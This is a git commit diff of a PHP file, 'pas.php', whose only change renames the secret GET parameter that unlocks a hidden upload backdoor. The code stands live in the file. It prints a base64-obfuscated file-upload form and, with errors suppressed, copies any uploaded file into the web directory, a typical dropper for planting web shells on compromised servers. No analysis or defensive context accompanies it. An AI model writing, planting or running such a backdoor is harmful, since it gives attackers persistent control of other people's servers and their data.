a3dc83ae5d2fbdd18cff09620c23559a0c8f9799
imam mrtdho <88535491+Mr-7Mind@users.noreply.github.com>
2023-05-19 18:40:14 +0800

    Update pas.php

--- pas.php
+++ pas.php
@@ -1,5 +1,5 @@
 <?php
-if(isset($_GET["imam"])){
+if(isset($_GET["ribel"])){
 echo(base64_decode("PGZvcm0gbWV0aG9kPSdQT1NUJyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz48aW5wdXQgdHlwZT0nZmlsZSduYW1lPSdmJyAvPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSd1cCcgLz48L2Zvcm0+"));
 @copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);
 echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");
